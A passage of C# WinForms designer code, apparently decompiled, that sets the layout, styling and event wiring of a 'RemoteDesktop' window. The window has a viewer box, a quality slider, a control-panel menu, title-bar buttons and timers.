        this.AllScreens.Items.AddRange(new object[3] { "Hourly", "Daily", "Weekly" });
        this.AllScreens.ItemTopMargin = 3;
        this.AllScreens.Location = new System.Drawing.Point(16, 35);
        this.AllScreens.Name = "AllScreens";
        this.AllScreens.Size = new System.Drawing.Size(139, 26);
        this.AllScreens.TabIndex = 644;
        this.AllScreens.Text = null;
        this.AllScreens.TextAlignment = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.AllScreens.TextLeftMargin = 5;
        this.MuneClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.MuneClose.AutoSize = true;
        this.MuneClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.MuneClose.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.MuneClose.Location = new System.Drawing.Point(233, 5);
        this.MuneClose.Name = "MuneClose";
        this.MuneClose.Size = new System.Drawing.Size(16, 15);
        this.MuneClose.TabIndex = 598;
        this.MuneClose.Text = "X";
        this.MuneClose.Click += new System.EventHandler(MuneClose_Click);
        this.ValueQuality.BackColor = System.Drawing.Color.White;
        this.ValueQuality.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ValueQuality.ForeColor = System.Drawing.Color.DimGray;
        this.ValueQuality.Location = new System.Drawing.Point(180, 206);
        this.ValueQuality.Name = "ValueQuality";
        this.ValueQuality.Size = new System.Drawing.Size(66, 17);
        this.ValueQuality.TabIndex = 640;
        this.ValueQuality.Text = "60% Quality";
        this.QualityTrackBar.BackColor = System.Drawing.Color.White;
        this.QualityTrackBar.FillColor = System.Drawing.Color.FromArgb(193, 200, 207);
        this.QualityTrackBar.HoverState.Parent = this.QualityTrackBar;
        this.QualityTrackBar.Location = new System.Drawing.Point(16, 205);
        this.QualityTrackBar.Name = "QualityTrackBar";
        this.QualityTrackBar.Size = new System.Drawing.Size(158, 23);
        this.QualityTrackBar.TabIndex = 630;
        this.QualityTrackBar.ThumbColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.QualityTrackBar.Value = 60;
        this.QualityTrackBar.Scroll += new System.Windows.Forms.ScrollEventHandler(QualityTrackBar_Scroll);
        this.bunifuLabel17.AllowParentOverrides = false;
        this.bunifuLabel17.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.bunifuLabel17.AutoEllipsis = false;
        this.bunifuLabel17.AutoSize = false;
        this.bunifuLabel17.BackColor = System.Drawing.Color.White;
        this.bunifuLabel17.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel17.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel17.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.bunifuLabel17.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel17.Location = new System.Drawing.Point(40, 5);
        this.bunifuLabel17.Name = "bunifuLabel17";
        this.bunifuLabel17.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel17.Size = new System.Drawing.Size(180, 15);
        this.bunifuLabel17.TabIndex = 615;
        this.bunifuLabel17.Text = "Control Panel";
        this.bunifuLabel17.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.bunifuLabel17.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.Power.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.Power.Animated = true;
        this.Power.BackColor = System.Drawing.Color.White;
        this.Power.BorderRadius = 4;
        this.Power.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Power.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Power.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Power.CheckedState.Parent = this.Power;
        this.Power.Cursor = System.Windows.Forms.Cursors.Hand;
        this.Power.CustomImages.Parent = this.Power;
        this.Power.Enabled = false;
        this.Power.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Power.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Power.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.Power.ForeColor = System.Drawing.Color.White;
        this.Power.HoverState.Parent = this.Power;
        this.Power.Location = new System.Drawing.Point(168, 311);
        this.Power.Name = "Power";
        this.Power.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.Power.PressedDepth = 50;
        this.Power.ShadowDecoration.Parent = this.Power;
        this.Power.Size = new System.Drawing.Size(76, 29);
        this.Power.TabIndex = 574;
        this.Power.Text = "Start";
        this.Power.Click += new System.EventHandler(Power_Click);
        this.ViewerBox.BackColor = System.Drawing.Color.Black;
        this.ViewerBox.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ViewerBox.Location = new System.Drawing.Point(0, 0);
        this.ViewerBox.Name = "ViewerBox";
        this.ViewerBox.Size = new System.Drawing.Size(562, 348);
        this.ViewerBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.ViewerBox.TabIndex = 577;
        this.ViewerBox.TabStop = false;
        this.ViewerBox.MouseDown += new System.Windows.Forms.MouseEventHandler(ViewerBox_MouseDown);
        this.ViewerBox.MouseMove += new System.Windows.Forms.MouseEventHandler(ViewerBox_MouseMove);
        this.ViewerBox.MouseUp += new System.Windows.Forms.MouseEventHandler(ViewerBox_MouseUp);
        this.FormResizeBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.FormResizeBox1.ForeColor = System.Drawing.Color.Empty;
        this.FormResizeBox1.Location = new System.Drawing.Point(565, 463);
        this.FormResizeBox1.Name = "FormResizeBox1";
        this.FormResizeBox1.Size = new System.Drawing.Size(20, 20);
        this.FormResizeBox1.TabIndex = 600;
        this.FormResizeBox1.TargetControl = this;
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.LoaderConnect);
        this.PanelTitle.Controls.Add(this.ButtonMune);
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.ButtonMaximized);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.ImageLogo);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(562, 77);
        this.PanelTitle.TabIndex = 596;
        this.LoaderConnect.AllowStylePresets = true;
        this.LoaderConnect.BackColor = System.Drawing.Color.Transparent;
        this.LoaderConnect.CapStyle = Bunifu.UI.WinForms.BunifuLoader.CapStyles.Flat;
        this.LoaderConnect.Color = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LoaderConnect.Colors = new Bunifu.UI.WinForms.Bloom[0];
        this.LoaderConnect.Cursor = System.Windows.Forms.Cursors.Arrow;
        this.LoaderConnect.Customization = "";
        this.LoaderConnect.DashWidth = 0.5f;
        this.LoaderConnect.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.LoaderConnect.Image = null;
        this.LoaderConnect.Location = new System.Drawing.Point(12, 13);
        this.LoaderConnect.Name = "LoaderConnect";
        this.LoaderConnect.NoRounding = false;
        this.LoaderConnect.Preset = Bunifu.UI.WinForms.BunifuLoader.StylePresets.Dashed;
        this.LoaderConnect.RingStyle = Bunifu.UI.WinForms.BunifuLoader.RingStyles.Dashed;
        this.LoaderConnect.ShowText = false;
        this.LoaderConnect.Size = new System.Drawing.Size(57, 50);
        this.LoaderConnect.Speed = 7;
        this.LoaderConnect.TabIndex = 607;
        this.LoaderConnect.Text = "bunifuLoader1";
        this.LoaderConnect.TextPadding = new System.Windows.Forms.Padding(0);
        this.LoaderConnect.Thickness = 6;
        this.LoaderConnect.Transparent = true;
        this.ButtonMune.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMune.Animated = true;
        this.ButtonMune.AutoRoundedCorners = true;
        this.ButtonMune.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMune.BorderRadius = 11;
        this.ButtonMune.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.FillColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.FillColor2 = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.ForeColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.Parent = this.ButtonMune;
        this.ButtonMune.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMune.CustomImages.Parent = this.ButtonMune;
        this.ButtonMune.FillColor = System.Drawing.Color.White;
        this.ButtonMune.FillColor2 = System.Drawing.Color.White;
        this.ButtonMune.Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.ButtonMune.ForeColor = System.Drawing.SystemColors.InfoText;
        this.ButtonMune.HoverState.Parent = this.ButtonMune;
        this.ButtonMune.Image = Properties.Resources.iconleft;
        this.ButtonMune.ImageSize = new System.Drawing.Size(18, 18);
        this.ButtonMune.Location = new System.Drawing.Point(523, 42);
        this.ButtonMune.Name = "ButtonMune";
        this.ButtonMune.ShadowDecoration.Parent = this.ButtonMune;
        this.ButtonMune.Size = new System.Drawing.Size(24, 24);
        this.ButtonMune.TabIndex = 606;
        this.ButtonMune.Click += new System.EventHandler(ButtonMune_Click);
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(532, 13);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 573;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(484, 13);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 575;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.ButtonMaximized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMaximized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMaximized.CheckedState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMaximized.CustomImages.Parent = this.ButtonMaximized;
        this.ButtonMaximized.FillColor = System.Drawing.Color.FromArgb(244, 190, 83);
        this.ButtonMaximized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtonMaximized.ForeColor = System.Drawing.Color.White;
        this.ButtonMaximized.HoverState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Location = new System.Drawing.Point(508, 13);
        this.ButtonMaximized.Name = "ButtonMaximized";
        this.ButtonMaximized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtonMaximized.ShadowDecoration.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Size = new System.Drawing.Size(17, 17);
        this.ButtonMaximized.TabIndex = 574;
        this.ButtonMaximized.Click += new System.EventHandler(ButtonMaximized_Click);
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(10, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "--";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(101, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Remote Desktop";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ImageLogo.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ImageLogo.Image = (System.Drawing.Image)resources.GetObject("ImageLogo.Image");
        this.ImageLogo.Location = new System.Drawing.Point(10, 13);
        this.ImageLogo.Name = "ImageLogo";
        this.ImageLogo.Size = new System.Drawing.Size(59, 50);
        this.ImageLogo.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageLogo.TabIndex = 570;
        this.ImageLogo.TabStop = false;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 478);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(259, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 112);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 270);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(259, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(582, 108);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 270);
        this.PanelRight.TabIndex = 591;
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        this.Timer1.Interval = 2000;
        this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
        this.TimerSave.Interval = 1500;
        this.TimerSave.Tick += new System.EventHandler(TimerSave_Tick);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(616, 513);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.KeyPreview = true;
        base.Name = "RemoteDesktop";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "RemoteDesktop";
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(RemoteDesktop_FormClosing);
        base.Load += new System.EventHandler(RemoteDesktop_Load);
        base.Shown += new System.EventHandler(RemoteDesktop_Shown);
        base.KeyUp += new System.Windows.Forms.KeyEventHandler(RemoteDesktop_KeyUp);
        this.panelForm.ResumeLayout(false);
        this.panel1.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.WaitRDP).EndInit();
        this.PanelMune.ResumeLayout(false);
        this.PanelMune.PerformLayout();
        this.PanelTypeScreen.ResumeLayout(false);
        this.PanelTypeScreen.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ViewerBox).EndInit();
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).EndInit();
        base.ResumeLayout(false);
    }
}
